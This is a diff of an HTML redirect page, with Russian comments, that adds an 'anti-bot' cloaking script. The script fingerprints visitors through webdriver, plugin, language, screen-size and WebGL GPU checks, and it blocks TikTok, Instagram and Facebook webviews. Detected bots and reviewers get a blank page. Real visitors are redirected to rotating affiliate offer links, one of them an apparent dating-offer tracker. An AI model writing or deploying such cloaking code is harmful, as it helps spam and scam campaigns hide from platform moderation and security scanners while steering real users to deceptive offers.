@@ -4,61 +4,83 @@
   <meta charset="UTF-8" />
   <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
   <script>
     const offers = [
       "https://sisuny.top/click?o=2&a=6549&sub_id1=pysmom",
-      
       "https://grzvkg.amurllove.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=212364&s2=2183582"
-      
     ];
 
-    function isMobileDevice() {
+    // ---------- АНТИБОТ ----------
+    function isBot() {
       const ua = navigator.userAgent.toLowerCase();
-      return /android|iphone|ipad|ipod/.test(ua);
+
+      // 1. Простой webdriver
+      if (navigator.webdriver) return true;
+
+      // 2. Подозрительно нет плагинов
+      if (navigator.plugins.length === 0) return true;
+
+      // 3. Нет языков — боты так часто палятся
+      if (!navigator.languages || navigator.languages.length === 0) return true;
+
+      // 4. Headless браузеры
+      if (ua.includes("headless") || ua.includes("phantomjs")) return true;
+
+      // 5. Экран как у бота
+      const w = window.innerWidth;
+      const h = window.innerHeight;
+      if ((w === 800 && h === 600) || (w === 1024 && h === 768)) return true;
+
+      // 6. WebGL проверка GPU
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!gl) return true;
+
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+        const badGPU = ["swiftshader", "mesa", "llvmpipe", "software"];
+        if (renderer && badGPU.some(g => renderer.toLowerCase().includes(g))) return true;
+      } catch(e) {
+        return true;
+      }
+
+      // 7. TikTok / Instagram / FB WebView боты
+      if (ua.includes("tiktok") || ua.includes("instagram") || ua.includes("fbav")) {
+        return true;
+      }
+
+      return false; // НЕ бот
     }
 
-    function isMobileBrowser() {
-      const ua = navigator.userAgent.toLowerCase();
-      return /mobile|safari|crios|chrome|samsungbrowser/.test(ua);
-    }
-
-    function isRealMobileUser() {
-      return isMobileDevice() && isMobileBrowser();
-    }
-
+    // ---------- Хеш для равномерного распределения ----------
     function hashString(str) {
       let hash = 0;
       for (let i = 0; i < str.length; i++) {
         hash = ((hash << 5) - hash) + str.charCodeAt(i);
-        hash |= 0; // Convert to 32bit integer
+        hash |= 0;
       }
       return Math.abs(hash);
     }
 
-    // Генерируем хеш от юзер-агента и времени захода (±детерминированно)
-    const ua = navigator.userAgent;
-    const now = new Date().getTime();
-    const salt = Math.floor(now / (1000 * 60 * 60)); // 1 час как "сессия"
-    const hash = hashString(ua + salt);
-    const offerIndex = hash % offers.length;
+    // 20-минутная сессия
+    const sessionSalt = Math.floor(Date.now() / (1000 * 60 * 20));
+    const seed = navigator.userAgent + sessionSalt;
+    const index = hashString(seed) % offers.length;
 
-    const redirectTo = isRealMobileUser()
-      ? offers[offerIndex]
-      : "https://t.me/me9fun";
-
-    window.location.href = redirectTo;
+    // ---------- ЛОГИКА ПЕРЕХОДА ----------
+    if (isBot()) {
+      // Бот → пустая страница (или своя заглушка)
+      window.location.href = "about:blank";
+    } else {
+      // Человек → оффер
+      window.location.href = offers[index];
+    }
   </script>
 </head>
 <body>
   <p>Redirecting...</p>
 </body>
 </html>
-
- 
-
-
-
-
-
-
-
